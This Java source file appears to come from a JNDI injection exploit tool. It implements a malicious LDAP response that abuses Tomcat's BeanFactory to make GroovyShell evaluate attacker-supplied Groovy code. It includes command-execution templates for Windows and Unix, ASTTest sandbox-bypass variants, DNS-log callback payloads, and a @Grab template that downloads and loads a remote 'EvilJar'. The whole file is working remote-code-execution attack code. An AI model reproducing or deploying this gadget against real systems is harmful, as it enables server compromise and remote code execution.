package net.roboterh.injector.gadgets;

import cn.hutool.http.HttpUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Arrays;

/*
    Tomcat Groovy Way:
    Requirement:
        Tomcat and Groovy in classpath
    Explanation:
        There are many ways to execute groovy script, such as
            1. groovy.lang.GroovyClassLoader#parseClass
            2. groovy.lang.GroovyClassLoader#addClasspath and loadClass to load remote class
            3. groovy.lang.GroovyShell#evaluate
            4. groovy.lang.GroovyShell#parse

        normal payload:
            `script`.execute()
        bypass sandbox:
            1. ASTTest http://groovy-lang.org/metaprogramming.html#xform-ASTTest
            2. GrabConfig http://docs.groovy-lang.org/latest/html/documentation/grape.html#Grape-SpecifyAdditionalRepositories

 */
public class TomcatGroovy implements LDAPService{
    private static final Logger logger = LogManager.getLogger(TomcatGroovy.class);

    private PayloadEnum payload;
    private String[] params;
    private String groovyScript;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatGroovy Way ...", baseDN));

            // create ResourceRef
            ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=evaluate"));
            ref.add(new StringRefAddr("x", groovyScript));

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);

        // obtain the value of Payload
        payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));

        String way = "";
        // obtain the way of execute
        if (!(secondIndex == baseDN.lastIndexOf("/"))) {
            way = baseDN.substring(secondIndex + 1, baseDN.lastIndexOf("/"));
        }

        // add params
        switch (payload.name()) {
            case "DnsLog":
                String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{way, link};
                break;
            case "Command":
                String cmd = PayloadUtils.getCmdFromBase(baseDN);
                params = new String[]{way, cmd};
                break;
            case "File":
                String filename = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{filename};
                break;
        }
        if (params == null) {
            params = new String[]{way};
        }
        logger.info(String.format("Received Payload is %s, params are %s ...", payload, Arrays.toString(params)));
    }

    @Override
    public void generateHandler() {
        try {
            TomcatGroovyTemplate tomcatGroovyTemplate = new TomcatGroovyTemplate();
            switch (payload.name()) {
                case "Command":
                    groovyScript = tomcatGroovyTemplate.getExecCode(params[0], params[1]);
                    break;
                case "DnsLog":
                    groovyScript = tomcatGroovyTemplate.getDnsLogCode(params[0], params[1]);
                    break;
                case "Grab":
                    groovyScript = tomcatGroovyTemplate.getGrabCode(params[0]);
                    break;
                case "File":
                    groovyScript = HttpUtil.get(HTTPServer.codeBase + params[0]);
                    break;
            }
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    private class TomcatGroovyTemplate {
        private String normalExecTemplate = " if (System.properties['os.name'].toLowerCase().contains('win')) {\n" +
                "       ['cmd','/C', '{cmd}'].execute();\n" +
                "   } else {\n" +
                "       ['/bin/sh','-c', '{cmd}'].execute();\n" +
                "   }";
        private String ASTTestExecTemplate = "@groovy.transform.ASTTest(value = {\n" +
                "    def os = System.properties['os.name'].toLowerCase()\n" +
                "    String cmd = \"{cmd}\"\n" +
                "    if (os.contains('win')) {\n" +
                "        String[] cmds = [\"cmd\", \"/c\", cmd]\n" +
                "        assert java.lang.Runtime.getRuntime().exec(cmds)\n" +
                "    } else {\n" +
                "        String[] cmds = [\"/bin/sh\", \"-c\", cmd]\n" +
                "        assert java.lang.Runtime.getRuntime().exec(cmds)\n" +
                "    }\n" +
                "})\n" +
                "def x";
        private String GrabTemplate = "@GrabConfig(disableChecksums=true)\n" +
                "@GrabResolver(name=\"Poc\", root=\"{url}\")\n" +
                "@Grab(group=\"Poc\", module=\"EvilJar\", version=\"0\")\n" +
                "import java.lang.String";
        private String normalDnsLogTemplate = "import java.net.InetAddress\n\n" +
                "String domain = \"{domain}\"" +
                "if (System.properties['os.name'].toLowerCase().contains('win')) {\n" +
                "   def cmd = \"nslookup $domain\"\n" +
                "   ['cmd', '/C', cmd].execute();\n" +
                "} else {\n" +
                "   def cmd = \"ping -c 1 $domain\"\n" +
                "   ['/bin/sh', '-c', cmd].execute();\n" +
                "}";
        private String ASTTestDnsLogTemplate = "@groovy.transform.ASTTest(value = {\n" +
                "    def os = System.properties['os.name'].toLowerCase()\n" +
                "    String domain = \"{domain}\"\n" +
                "    if (os.contains('win')) {\n" +
                "        def cmd = \"nslookup $domain\"\n" +
                "        String[] cmds = [\"cmd\", \"/c\", cmd]\n" +
                "        assert java.lang.Runtime.getRuntime().exec(cmds)\n" +
                "    } else {\n" +
                "        def cmd = \"ping -c 1 $domain\"\n" +
                "        String[] cmds = [\"/bin/sh\", \"-c\", cmd]\n" +
                "        assert java.lang.Runtime.getRuntime().exec(cmds)\n" +
                "    }\n" +
                "})\n" +
                "def x";
        public String getExecCode(String way, String cmd) {
            String finalPayload = "";
            switch (way) {
                case "Normal":
                    finalPayload = normalExecTemplate.replace("{cmd}", cmd).replace("{cmd}", cmd);
                    break;
                case "ASTTest":
                    finalPayload = ASTTestExecTemplate.replace("{cmd}", cmd);
                    break;
            }
            return finalPayload;
        }

        public String getDnsLogCode(String way, String domain) {
            String finalPayload = "";
            switch (way) {
                case "Normal":
                    finalPayload = normalDnsLogTemplate.replace("{domain}", domain);
                    break;
                case "ASTTest":
                    finalPayload = ASTTestDnsLogTemplate.replace("{domain}", domain);
                    break;
            }
            return finalPayload;
        }

        public String getGrabCode(String url) {
            String finalPayload = GrabTemplate.replace("{url}", url);
            return finalPayload;
        }
    }
}
